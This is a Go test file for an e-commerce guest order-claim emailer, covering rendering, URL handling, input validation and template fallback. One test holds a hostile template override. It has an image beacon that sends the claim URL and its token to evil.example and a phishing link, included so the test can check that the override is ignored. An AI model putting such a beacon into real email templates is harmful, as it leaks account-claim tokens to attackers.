package main

import (
	"context"
	"errors"
	"io"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/akarso/shopanda/internal/application/notification"
	storeidentity "github.com/akarso/shopanda/internal/application/storeidentity"
	"github.com/akarso/shopanda/internal/domain/mail"
	"github.com/akarso/shopanda/internal/domain/store"
	"github.com/akarso/shopanda/internal/platform/logger"
)

type claimMailerStub struct {
	last mail.Message
}

func (m *claimMailerStub) Send(_ context.Context, msg mail.Message) error {
	m.last = msg
	return nil
}

type claimStoreRepoStub struct {
	store.StoreRepository
	def *store.Store
}

func (r *claimStoreRepoStub) FindDefault(context.Context) (*store.Store, error) {
	return r.def, nil
}

func loadClaimTemplates(t *testing.T) (*mail.Templates, mail.Layout) {
	t.Helper()
	dir := filepath.Join("..", "..", "templates", "emails")
	tmpl := mail.NewTemplates()
	notification.RegisterTemplates(tmpl)
	lr, err := loadFileEmailTemplates(tmpl, dir, logger.NewWithWriter(io.Discard, "error"))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if lr == nil {
		t.Fatal("expected layout from repo tree")
	}
	return tmpl, lr
}

func TestStorefrontOrderClaimEmailer_RendersOrderClaim(t *testing.T) {
	tmpl, lr := loadClaimTemplates(t)
	stub := &claimMailerStub{}
	emailer := storefrontOrderClaimEmailer{
		mailer:    stub,
		claimURL:  "https://shop.example/account/orders/claim",
		storeURL:  "https://shop.example",
		templates: tmpl,
		layout:    lr,
		brand: storeidentity.EmailBrandSource{
			Stores: &claimStoreRepoStub{def: &store.Store{ID: "s1", Name: "Acme Claim Co"}},
		},
		tokenTTL: 45 * time.Minute,
	}
	if err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok-1"); err != nil {
		t.Fatalf("SendClaimEmail: %v", err)
	}
	if stub.last.To != "guest@example.com" {
		t.Fatalf("to = %q", stub.last.To)
	}
	if stub.last.Subject != "Claim your guest order" {
		t.Fatalf("subject = %q", stub.last.Subject)
	}
	if !strings.Contains(stub.last.Body, `href="https://shop.example/account/orders/claim?claim_token=tok-1"`) {
		t.Fatalf("body missing href with token: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, `background: #333333; color: #ffffff; text-decoration: none; border-radius: 4px;`) {
		t.Fatalf("body missing file-only button style: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, "Or copy this link:") {
		t.Fatalf("body missing copy-paste URL label: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, "https://shop.example/account/orders/claim?claim_token=tok-1") {
		t.Fatalf("body missing plaintext claim URL: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, "45 minutes") {
		t.Fatalf("body missing expiry: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, "If you did not place an order") {
		t.Fatalf("body missing ignore line: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, `class="container"`) {
		t.Fatalf("body missing layout wrap: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, "Acme Claim Co") {
		t.Fatalf("body missing brand store name: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Text, "claim_token=tok-1") {
		t.Fatalf("plain text missing claim URL: %q", stub.last.Text)
	}
	if !strings.Contains(stub.last.Text, "45 minutes") {
		t.Fatalf("plain text missing expiry: %q", stub.last.Text)
	}
}

func TestStorefrontOrderClaimEmailer_PreservesExistingQuery(t *testing.T) {
	tmpl, lr := loadClaimTemplates(t)
	stub := &claimMailerStub{}
	emailer := storefrontOrderClaimEmailer{
		mailer:    stub,
		claimURL:  "https://shop.example/account/orders/claim?lang=en",
		templates: tmpl,
		layout:    lr,
		tokenTTL:  10 * time.Minute,
	}
	if err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok-2"); err != nil {
		t.Fatalf("SendClaimEmail: %v", err)
	}
	if !strings.Contains(stub.last.Body, "claim_token=tok-2") {
		t.Fatalf("missing token: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, "lang=en") {
		t.Fatalf("lost existing query: %s", stub.last.Body)
	}
	// HTML attribute encoding turns & into &amp;
	if !strings.Contains(stub.last.Body, "lang=en&amp;claim_token=tok-2") &&
		!strings.Contains(stub.last.Body, "claim_token=tok-2&amp;lang=en") {
		t.Fatalf("href should encode query amp: %s", stub.last.Body)
	}
}

func TestStorefrontOrderClaimEmailer_RejectsNilTemplates(t *testing.T) {
	emailer := storefrontOrderClaimEmailer{
		mailer:   &claimMailerStub{},
		claimURL: "https://shop.example/account/orders/claim",
	}
	err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok")
	if err == nil || !strings.Contains(err.Error(), "templates not configured") {
		t.Fatalf("err = %v", err)
	}
}

func TestStorefrontOrderClaimEmailer_RejectsInvalidClaimURL(t *testing.T) {
	tmpl, lr := loadClaimTemplates(t)
	emailer := storefrontOrderClaimEmailer{
		mailer:    &claimMailerStub{},
		claimURL:  "/relative/claim",
		templates: tmpl,
		layout:    lr,
	}
	err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok")
	if err == nil || !strings.Contains(err.Error(), "invalid claim URL") {
		t.Fatalf("err = %v", err)
	}
}

func TestStorefrontOrderClaimEmailer_RejectsEmptyToken(t *testing.T) {
	tmpl, lr := loadClaimTemplates(t)
	emailer := storefrontOrderClaimEmailer{
		mailer:    &claimMailerStub{},
		claimURL:  "https://shop.example/account/orders/claim",
		templates: tmpl,
		layout:    lr,
	}
	err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "  ")
	if err == nil || !strings.Contains(err.Error(), "empty claim token") {
		t.Fatalf("err = %v", err)
	}
}

type claimOverrideStub struct {
	subject, body string
}

func (o claimOverrideStub) Get(_ context.Context, storeID, name, locale string) (string, string, error) {
	if storeID != "s1" || name != "order_claim" {
		return "", "", mail.ErrTemplateNotFound
	}
	return o.subject, o.body, nil
}

func TestStorefrontOrderClaimEmailer_FindDefaultErrorStillSendsFile(t *testing.T) {
	tmpl, lr := loadClaimTemplates(t)
	stub := &claimMailerStub{}
	emailer := storefrontOrderClaimEmailer{
		mailer:    stub,
		claimURL:  "https://shop.example/account/orders/claim",
		storeURL:  "https://shop.example",
		templates: tmpl,
		layout:    lr,
		resolve: func(context.Context) (string, string, error) {
			return "", "", errors.New("stores down")
		},
		tokenTTL: 15 * time.Minute,
	}
	if err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok-outage"); err != nil {
		t.Fatalf("SendClaimEmail: %v", err)
	}
	if stub.last.Subject != "Claim your guest order" {
		t.Fatalf("subject = %q, want file template", stub.last.Subject)
	}
	if !strings.Contains(stub.last.Body, "claim_token=tok-outage") {
		t.Fatalf("body missing claim URL: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Text, "claim_token=tok-outage") {
		t.Fatalf("plain text missing claim URL: %q", stub.last.Text)
	}
}

func TestStorefrontOrderClaimEmailer_IgnoresDBOverrideBeacon(t *testing.T) {
	tmpl, lr := loadClaimTemplates(t)
	stub := &claimMailerStub{}
	emailer := storefrontOrderClaimEmailer{
		mailer:    stub,
		claimURL:  "https://shop.example/account/orders/claim",
		storeURL:  "https://shop.example",
		templates: tmpl,
		layout:    lr,
		overrides: claimOverrideStub{
			subject: "Hijacked subject",
			body: `<img src="https://evil.example/c?u={{.Data.ClaimURL}}">` +
				`<a href="https://evil.example/claim">Claim your order</a>` +
				`<p>{{.Data.ClaimURL}}</p>`,
		},
		resolve: func(context.Context) (string, string, error) {
			return "s1", "de", nil
		},
		tokenTTL: 30 * time.Minute,
	}
	if err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok-de"); err != nil {
		t.Fatalf("SendClaimEmail: %v", err)
	}
	if stub.last.Subject != "Claim your guest order" {
		t.Fatalf("subject = %q, want file template (order_claim not overridable)", stub.last.Subject)
	}
	if strings.Contains(stub.last.Body, "evil.example") {
		t.Fatalf("DB beacon body must not send: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Body, `href="https://shop.example/account/orders/claim?claim_token=tok-de"`) {
		t.Fatalf("body missing file claim href: %s", stub.last.Body)
	}
	if !strings.Contains(stub.last.Text, "claim_token=tok-de") || !strings.Contains(stub.last.Text, "Use the link below") {
		t.Fatalf("plain text = %q", stub.last.Text)
	}
}
